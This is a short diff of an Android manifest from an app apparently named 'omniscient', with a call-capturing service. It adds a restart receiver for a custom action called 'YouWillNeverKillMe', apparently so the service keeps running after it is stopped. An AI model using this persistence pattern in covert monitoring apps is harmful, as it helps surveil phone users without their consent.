@@ -44,11 +44,17 @@
             </intent-filter>
         </receiver>
 
-        <service android:name=".postal.catchPhone.Call.TService"></service>
+        <service android:name=".postal.catchPhone.Call.TService" />
         <service
             android:name=".postal.service.MyService"
             android:enabled="true"
-            android:exported="true"></service>
+            android:exported="true" />
+        <receiver android:name="com.postal.omniscient.postal.service.RestartServiceReceiver" >
+            <intent-filter>
+                <action android:name="YouWillNeverKillMe" >
+                </action>
+            </intent-filter>
+        </receiver>
     </application>
 
 </manifest>
